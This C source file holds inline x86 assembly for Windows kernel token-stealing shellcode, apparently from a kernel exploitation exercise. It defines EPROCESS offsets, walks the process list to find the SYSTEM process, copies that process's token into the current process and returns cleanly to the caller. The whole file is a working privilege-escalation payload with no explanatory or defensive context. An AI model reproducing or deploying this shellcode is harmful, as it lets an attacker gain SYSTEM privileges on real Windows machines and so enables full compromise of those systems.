#include "TokenStealingShellcode.h"
#include "stdio.h"

#define KTHREAD_OFFSET  0x124
#define EPROCESS_OFFSET 0x50
#define PID_OFFSET      0xb4
#define FLINK_OFFSET    0xb8
#define TOKEN_OFFSET    0xf8
#define SYSTEM_PID      0x4

VOID tokenStealingShellcode() {
	__asm {
		pushad

		xor eax, eax
		mov eax, fs: [KTHREAD_OFFSET]
		mov eax, [eax + EPROCESS_OFFSET]
		mov ecx, eax; copy current _EPROCESS struct
		mov edx, SYSTEM_PID

		SearchSystemPID :
		mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; cmp current pid with system pid
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]
			mov[ecx + TOKEN_OFFSET], edx


			popad
			pop edi
			pop esi
			pop ebx

			xor eax, eax
			pop ebp
			ret 0x8
	}
}